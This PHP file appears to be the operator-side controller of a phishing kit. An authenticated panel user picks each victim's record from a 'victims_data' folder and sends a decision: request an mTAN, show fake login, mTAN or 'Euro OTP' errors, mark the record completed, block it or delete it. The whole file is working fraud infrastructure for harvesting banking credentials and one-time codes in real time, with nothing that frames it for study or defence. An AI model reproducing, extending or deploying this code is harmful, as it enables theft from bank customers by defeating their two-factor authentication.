<?php
session_start();
if (!isset($_SESSION['panel_loggedin']) || $_SESSION['panel_loggedin'] !== true) {
    header('Location: login.php');
    exit;
}

if (isset($_GET['id'], $_GET['decision'])) {
    $victimId = basename($_GET['id']);
    $decision = $_GET['decision'];
    $filePath = '../victims_data/' . $victimId . '.json';

    if (file_exists($filePath)) {
        if ($decision === 'delete') {
            unlink($filePath);
        } else {
            $data = json_decode(file_get_contents($filePath), true);
            if (is_array($data)) {
                $data['decision'] = $decision;
                
                // Update status for panel display
                switch ($decision) {
                    case 'go_to_mtan': 
                        $data['status'] = 'Waiting for mTAN'; 
                        break;
                    case 'finish': 
                        $data['status'] = 'Completed'; 
                        break;
                    case 'show_full_login_error': 
                        $data['status'] = 'Action: Login Error Sent'; 
                        break;
                    case 'show_mtan_error': 
                        $data['status'] = 'Action: mTAN Error Sent'; 
                        break;
                    case 'show_euro_otp_error': 
                        $data['status'] = 'Action: Euro OTP Error Sent'; 
                        break;
                    case 'block': 
                        $data['status'] = 'Blocked'; 
                        break;
                }
                
                file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT));
            }
        }
    }
}

header('Location: dashboard.php');
exit;
?>